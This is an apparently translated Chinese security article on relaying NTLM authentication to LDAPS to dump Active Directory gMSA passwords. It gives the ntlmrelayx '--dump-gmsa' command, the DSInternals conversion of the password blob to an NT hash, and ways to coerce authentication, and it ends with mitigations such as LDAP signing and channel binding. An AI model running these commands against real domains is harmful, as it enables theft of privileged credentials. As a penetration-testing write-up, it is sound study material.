![](https://image.3001.net/images/20200222/1582369522_5e510af2137a1.png!small)

##  概述

 **gMSA，英文全称为“Group Managed Service
Accounts”，即活动目录AD中的组托管服务账户。gMSA账户会将它们的密码存储在一个名叫“msDS-ManagedPassword”的LDAP属性中，DC每隔三十天就会自动对这个值进行重置，授权管理员以及安装它们的服务器都可以检索到这些密码。msDS-ManagedPassword是一个加密的数据块，名为“MSDS-MANAGEDPASSWORD_BLOB”，并且只有当连接是安全的时候（LDAPS或认证类型为‘Sealing &Secure’）才可以被检索到。**

其实在此之前，我个人对gMSA了解的并不多，但是在观看了由Wald0和CptJesus主办的《Bloodhound
3.0》网络研讨会之后，我对gMSA有了新的认识，而这个研讨会主要讨论了gMSA为什么应该在渗透测试中成为焦点。

![](https://image.3001.net/images/20200222/1582369528_5e510af807b95.png!small)

分析之后我们了解到，一般来说除了授权管理员，目标设备上还可能会有更多的用户账号被授予了读取gMSA密码的权限，而gMSA帐户通常会被授予管理员权限，有的时候甚至会被授予域管理权限。

**那我们应该怎么去利用这种安全问题呢？我们如何才能收集到那些特权账号的密码呢？**

因为目前社区有很多技术可以帮助我们生成传入的NTLM身份验证连接，而这种类型的身份验证密码都存储在一个LDAP属性之中。我认为最佳的解决方案，就是从ntlmrelayx中的LDAP属性msDS-ManagedPassword中检索密码【[参考资料](https://github.com/SecureAuthCorp/impacket/pull/770)】。

##  与LDAP的中继链接

要通过NTLM中继实现一条与LDAP的连接，我们必须确保中继的身份验证连接使用的是HTTP协议。由于连接所需的签名数据位，我们无法中继SMB认证连接，不过[漏洞CVE-2019-1040](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1040)能够帮助我们绕过NTLM签名保护机制，这样我们就可以实现中继SMB->LDAP了。

###  NTLM中继过程如下：

> 1、目标向攻击者发送一个NTLM_NEGOTIATE数据包；
>
> 2、接下来，攻击者将NTLM_NEGOTIATE数据包中继至所选的目标服务器；
>
> 3、目标服务器向攻击者发送应答信息，其中包含一个NTLM_CHALLENGE数据包；
>
> 4、攻击者将NTLM_CHALLENGE数据包中继至目标；
>
> 5、目标向攻击者发送应答信息，其中包含一个NTLM_AUTHENTICATE数据包；
>
> 6、攻击者将NTLM_AUTHENTICATE数据包中继至目标服务器；
>
> 7、攻击者现在将成功与目标服务器建立已认证的会话连接；

![](https://image.3001.net/images/20200222/1582369591_5e510b379c839.png!small)

但遗憾的是，我没有在ntlmrelayx中成功实现“Sealing &
Secure”身份验证。现在，我们必须中继到LDAPS，而LDAPS只是通过SSL实现的LDAP，默认情况下活动目录AD安装是没有这种配置的，因为不存在默认的可用证书。

##  配置gMSA

    
    
    # Create a KDS Root Key on DC
    
        Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)
    
        # Create a new gMSA on DC
    
        New-ADServiceAccount -Name svc_msa -DNSHostName dc.htb.local -ManagedPasswordIntervalInDays 30 -PrincipalsAllowedToRetrieveManagedPassword msa_read,dc$
    
        #Install gMSA on the target server
    
        Install-WindowsFeature AD-DOMAIN-SERVICES
    
        Install-AdServiceAccount svc_msa

##  漏洞利用

首先，我们必须生成用于中继的NTLM认证请求，我们可以通过以下几种方式来实现，比如说：

> 1、ADIDNS通配符记录
>
> 2、Responder
>
> 3、WPAD + Mitm6
>
> 4、利用一个存在漏洞的服务器来创建HTTP认证请求

接下来，使用下列命令将我的代码库克隆至你的本地主机中，安装impacket，开启ntlmrelayx，然后选择你喜欢的方式来生成NTLM认证流量（关于如何生成NTLM认证流量的问题，本文不做过多描述）：

    
    
    git clone <https://github.com/cube0x0/impacket>
    
        cd impacket
    
        python setup.py install
    
        python ./examples/ntlmrelayx.py --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs -debug -t ldaps://10.0.0.5

![](https://image.3001.net/images/20200222/1582369630_5e510b5e38d21.png!small)

然后，使用DSInternals模块对数据块进行转换，由于密码存储在随机的Unicode字符中，所以我们还需要将明文密码转换为R**格式：

    
    
    (ConvertFrom-ADManagedPasswordBlob <blob>).SecureCurrentPassword | ConvertTo-NTHash

![](https://image.3001.net/images/20200222/1582369644_5e510b6ce8aaa.png!small)

##  缓解方案

NTLM至LDAP以及LDAPS的中继攻击可以通过启用LDAP签名以及LDAP信道绑定来进行攻击预防。除此之外，不要给多余的账号提供服务账号权限或特殊权限，每个组织都应该遵循最低特权模式的最佳实践方案。

##  参考资料

> 1、<https://www.secureauth.com/blog/playing-relayed-credentials>
>
>
> 2、<https://docs.google.com/presentation/d/1vZ1QckmtjpBsOff85IaP1mt4fEDmWYW3ziAHVHiLd5I/edit#slide=id.g7ddaaf9066_0_66>
>
> 3、<https://github.com/SecureAuthCorp/impacket/pull/770>
>
> 4、<https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-> active-directory/>

 *** 参考来源：[cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

